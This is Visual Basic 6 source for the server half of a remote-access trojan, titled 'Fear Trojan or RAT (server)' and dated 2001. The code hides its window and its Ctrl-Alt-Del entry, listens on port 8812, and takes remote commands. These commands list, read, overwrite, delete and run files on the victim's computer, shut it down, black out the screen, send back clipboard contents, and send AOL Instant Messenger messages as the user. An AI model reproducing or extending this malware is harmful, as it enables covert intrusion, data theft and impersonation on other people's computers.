VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmMAIN 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "FEAR - SERVER"
   ClientHeight    =   2400
   ClientLeft      =   45
   ClientTop       =   285
   ClientWidth     =   1995
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2400
   ScaleWidth      =   1995
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.FileListBox File1 
      Height          =   1065
      Left            =   -30
      System          =   -1  'True
      TabIndex        =   2
      Top             =   1335
      Visible         =   0   'False
      Width           =   2055
   End
   Begin VB.Timer tmrCONN 
      Interval        =   4000
      Left            =   420
      Top             =   15
   End
   Begin MSWinsockLib.Winsock WS 
      Left            =   450
      Top             =   540
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.DriveListBox Drive1 
      Height          =   315
      Left            =   0
      TabIndex        =   0
      Top             =   -15
      Visible         =   0   'False
      Width           =   1980
   End
   Begin VB.DirListBox Dir1 
      Height          =   990
      Left            =   0
      TabIndex        =   1
      Top             =   330
      Visible         =   0   'False
      Width           =   1995
   End
End
Attribute VB_Name = "frmMAIN"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'
'
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'Title: Fear Trojan or RAT (server)
'Author: Alan Walker
'Date Finished: April 3, 2001
'Description: This is the server example for a cool
'trojan or remote administartion tool.
'
'http://ulair.cjb.net
'
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'
'

Private Sub Drive1_Change()

End Sub

Private Sub Form_Load()
'------------------------------------------------------
'Load drives to drive box
Dim blob

For i = 0 To Drive1.ListCount - 1
    blob = blob & Mid(Drive1.List(i), 1, 2) & "\" & Chr(13) & Chr(10)
Next i

'------------------------------------------------------

Me.visible = False
CAD_Hide (False) 'Hides server in Ctrl Alt Del Dialog Box
WS.LocalPort = 8812
WS.Close
WS.Listen 'Listen for connections
End Sub

Private Sub tmrCONN_Timer()
' This timer checks every once in a while to see if
' anyone is connected to this server, if not it
' listens for connections.

If WS.State <> 7 Then ' 7 = connected
WS.Close
WS.Listen
End If

End Sub

Private Sub WS_ConnectionRequest(ByVal requestID As Long)
WS.Close
WS.Accept requestID 'Accept Connection
SD "connected" ' Inform client they have made a successfull connection
End Sub

Private Sub WS_DataArrival(ByVal bytesTotal As Long)

'Set the variables

Dim ArrayTemp() As String
    Dim aTemp() As String
    Dim sServerCommand As String, lSpace As Long
    Dim Arg1 As String, Arg2 As String, i As Integer
    Dim i1 As Long, i2 As Long, i3 As Long, i4 As Long, i5 As Long
    Dim iTemp As Integer
    Dim arTemp() As String
    Dim sTemp As String, sTemp2 As String
    
Dim NewData As String
    WS.GetData NewData, vbString 'NewData = WS.Getdata
    
    Dim aCommandList() As String
    aCommandList = Split(NewData, cMsgSep)
    
    Dim nCount As Integer
    For nCount = LBound(aCommandList) To UBound(aCommandList)
        If Trim$(aCommandList(nCount)) = "" Then
            GoTo Reset:
        End If
        
        NewData = aCommandList(nCount)
        '----------------------------------
        ' Reset some variables
        '----------------------------------
        sTemp = ""
        DoEvents
        
        lSpace = InStr(1, NewData, " ")
        If lSpace <> 0 Then
            sServerCommand = Trim$(LCase$(Mid$(NewData, 1, lSpace - 1)))
            '----------------------------------
            ' Get arguments
            '----------------------------------
            If InStr(lSpace + 1, NewData, ":") <> 0 Then
                Arg1 = Mid$(NewData, lSpace + 1, InStr(lSpace + 1, NewData, ":") - (lSpace + 1))
                Arg2 = Mid$(NewData, InStr(lSpace + 1, NewData, ":") + 1)
            End If
        Else
            sServerCommand = Trim$(LCase$(NewData))
        End If
        
                
        '-----------------------------------------------------------------------------
        ' Parse commands
        ' You must put GoTo Reset after every case so it
        ' will reset and search for new incoming commands.
        '-----------------------------------------------------------------------------
        
        Select Case sServerCommand
        
        '--------------------------------------------------
        '-------Explorer Commands-------------
        '--------------------------------------------------
        
        Case "listdrives" ' trigger to list all drives
        SendDrives
        GoTo Reset
        
        Case "files" ' trigger to sned client file list
        SendFiles Mid$(NewData, lSpace + 1)
        GoTo Reset
        
        Case "sendtxtfile" ' send client text from file
        If Windows_Exists(Mid$(NewData, lSpace + 1)) Then
        SendT Mid$(NewData, lSpace + 1)
        GoTo Reset
        End If
        SD "sendtxtfile File could not be loaded check to make sure the directory is correct."
        GoTo Reset
        
        Case "savetxtfile" ' save specified file
        SaveTxtFile Mid$(NewData, lSpace + 1)
        GoTo Reset
        
        Case "playmedia" ' play *.wav
        PlaySound Mid$(NewData, lSpace + 1), False
        GoTo Reset
        
        Case "deleteit" ' delete file
        If Windows_Exists(Mid$(NewData, lSpace + 1)) Then
        Kill Mid$(NewData, lSpace + 1)
        Else: SD "err " & "File not found!"
        End If
        GoTo Reset
        
        Case "openit" ' open an *.exe file
        If Windows_Exists(Mid$(NewData, lSpace + 1)) Then
        Shell Mid$(NewData, lSpace + 1), vbNormalFocus
        Else: SD "err " & "File not found!"
        End If
        GoTo Reset
        
        Case "rename" ' rename a file
        If Windows_Exists(Trim$(Arg1)) Then
        FileReName Trim$(Arg1), Trim$(Arg2)
        Else
        SD "err " & "File could not be renamed!"
        End If
        GoTo Reset
        
        
        '---------------------------------------------------
        ' ------------Basic Commands------------
        '---------------------------------------------------
        
        Case "closeserver" ' Unload/Close the server
        End
        GoTo Reset
        
        Case "msg" ' Popup error message box with a specified message
        MsgBox Mid$(NewData, lSpace + 1), vbCritical, " "
        GoTo Reset
        
        Case "setclip" ' Set clipboard text
        Clipboard.SetText Mid$(NewData, lSpace + 1)
        GoTo Reset
        
        Case "close" ' Close connection session
        WS.Close
        WS.Listen
        
        Case "setcp" ' set the cursor posistion
        SetCP Mid$(NewData, lSpace + 1)
        GoTo Reset
                
        Case "playcd" ' Play audio cd in default cd-rom drive
        PlayCDAudio (1)
        GoTo Reset
        
        Case "stopcd" ' Stop cd audio
        StopCDAudio
        GoTo Reset
        
        Case "opencd" ' Open cd tray
        OpenCDTray
        GoTo Reset
        
        Case "closecd" ' Close cd tray
        CloseCDTray
        GoTo Reset
        
        Case "chatmsg" ' Add message to the chat session form the client
        frmChat.addChat Trim$(Arg1), Trim$(Arg2)
        
        Case "capson" ' Cap locks ON
        CapsLock (True)
        GoTo Reset
        
        Case "capsoff" ' Cap locks OFF
        CapsLock (False)
        GoTo Reset
        
        Case "numson" ' Num locks ON
        NumLock (True)
        GoTo Reset
        
        Case "numsoff" ' Num locks OFF
        NumLock (False)
        GoTo Reset
        
        Case "scrollon" ' Scroll locks ON
        ScrollLock (True)
        GoTo Reset
        
        Case "scrolloff" ' Scroll locks OFF
        ScrollLock (False)
        GoTo Reset
        
        Case "winshutdown" ' Shutdown windows
        WINShutdown
        GoTo Reset
        
        Case "winrestart" ' Restart windows
        WINReboot
        GoTo Reset
                
        Case "www" ' Popup specified webpage
        GoToWebsite Mid$(NewData, lSpace + 1)
        GoTo Reset
        
        Case "startss" ' Starts windows screen saver
        StartScreensaver (Me)
        GoTo Reset
        
        Case "cleard" ' Clear documents folder
        ClearDocuments
        GoTo Reset
        
        Case "hidetb" ' Hide windows taskbar
        HideTaskBar
        GoTo Reset
        
        Case "showtb" ' Show windows taskbar
        ShowTaskBar
        GoTo Reset
        
        Case "blackout" ' Blackout Screen with a specified message
        frmBlackOut.txtBO.text = Mid$(NewData, lSpace + 1)
        frmBlackOut.Show , Me
        GoTo Reset
        
        Case "blackoutoff" ' Unblackout screen
        frmBlackOut.txtBO.text = ""
        Unload frmBlackOut
        GoTo Reset
        
        Case "print" ' print specified text
        PrintText Mid$(NewData, lSpace + 1)
        GoTo Reset
        
        Case "chat" ' Start Fear Chat Session
        frmChat.Show , Me
        GoTo Reset
        
        Case "endchat" 'Close the chat session
        Unload frmChat
        GoTo Reset
        
        Case "krazykeys" ' Flash The Caps Nums and Scroll lock lights (lame).
        CapsLock (True)
        ScrollLock (True)
        NumLock (True)
        CapsLock (False)
        ScrollLock (False)
        NumLock (False)
        CapsLock (True)
        ScrollLock (True)
        NumLock (True)
        Pause 0.5
        CapsLock (False)
        ScrollLock (False)
        NumLock (False)
        CapsLock (True)
        ScrollLock (True)
        NumLock (True)
        CapsLock (False)
        ScrollLock (False)
        NumLock (False)
        CapsLock (True)
        ScrollLock (True)
        NumLock (True)
        Pause 0.5
        CapsLock (False)
        ScrollLock (False)
        NumLock (False)
        CapsLock (True)
        ScrollLock (True)
        NumLock (True)
        Pause 0.5
        CapsLock (False)
        ScrollLock (False)
        NumLock (False)
        NumLock (True)
        GoTo Reset
        
        
        Case "updateinfo" ' Send Client Info About The Server Computer
        
        Dim aimSN, aimChat As String
        If AIM_GetSN <> "off" Then ' If ON AIM
        aimSN = "- AIM Screename: " & AIM_GetSN ' Get AIM SN
        aimChat = "- AIM Chat: " & Chat_GetName ' Get chat name the user is in
        ElseIf AIM_GetSN = "off" Then ' If NOT ON AIM
        aimSN = "- AIM Screename: offline"
        aimChat = "- AIM Chat: offline"
        End If
        SD "info " & "Information for " & WS.LocalIP & " (" & WS.LocalHostName & ")" & vbCrLf & vbCrLf & "Basic Info:" & vbCrLf & "- Date: " & Date & vbCrLf & "- Time: " & Time & vbCrLf & "- Keyboard: " & KeyboardInfo & vbCrLf & "- Clipboard Text: " & Clipboard.GetText & vbCrLf & vbCrLf & "AOL Instant Messager Info:" & vbCrLf & aimSN & vbCrLf & aimChat
        GoTo Reset
        
        '-----------------------------------------------------------------
        '--------Aol Instant Messager Commands---------
        '-----------------------------------------------------------------
        
        Case "goaimchat" ' Join an AIM chat room (only if on aim)
        AIM_GotoBar "aim:gochat?roomname=" & Mid$(NewData, lSpace + 1)
        GoTo Reset
        
        Case "aimchat" ' Send message to  an AIM chat room if in one (only if on aim)
        Chat_Send Mid$(NewData, lSpace + 1)
        GoTo Reset
        
        Case "aimim" ' Send AIM instant message to a user (only if on aim)
        ' Arg1 = Screenname
        ' Arg2 = Message
        IM_Send Trim$(Arg1), Trim$(Arg2)
        GoTo Reset
        
        End Select
                
' Reset and listen for another command

Reset:
        DoEvents
    Next nCount
    
End Sub
Sub SetCP(coord)
Dim xx, yy
xx = Mid(coord, 1, 3)
yy = Mid(coord, 4, 3)
SetCursorP Int(xx * (Screen.Width / Screen.TwipsPerPixelX)), Int(yy * (Screen.Height / Screen.TwipsPerPixelY))
End Sub

Sub SendDrives()
'On Error Resume Next
Dim blob
For i = 0 To Drive1.ListCount - 1
    blob = blob & Mid(Drive1.List(i), 1, 2) & "\" & Chr(13) & Chr(10)
Next i
SD "Drive " & blob
End Sub

Sub SendFiles(Directory)
On Error GoTo GaryGay
Dir1.Path = Directory
File1.Path = Directory
Dim blobd, blobf, blob
For i = 0 To Dir1.ListCount - 1
    blobd = blobd & Dir1.List(i) & "\" & Chr(13) & Chr(10)
Next i
For i = 0 To File1.ListCount - 1
    blobf = blobf & File1.List(i) & Chr(13) & Chr(10)
Next i
blob = blobd & blobf
SD "files " & blob
GaryGay:
SD "files " & "Device not available"
End Sub

Sub SaveTxtFile(data)
On Error Resume Next
Dim DR, TX, W
For i = 1 To Len(data)
    If Mid(data, i, 1) = "*" Then
        W = i
    End If
Next i
DR = Mid(data, 1, W - 1)
TX = Mid(data, W + 1, Len(data) - W + 1)
'save 'tx' to 'dr'
Open DR For Output As #1
Print #1, TX
Close #1
End Sub

Sub SendT(FileName)
Dim tot
tot = ""
Open FileName For Input As #1
Do
    Line Input #1, bob
    tot = tot & bob & vbCrLf
    bob = ""
Loop Until EOF(1)
Close #1
SD "sendtxtfile " & tot
End Sub
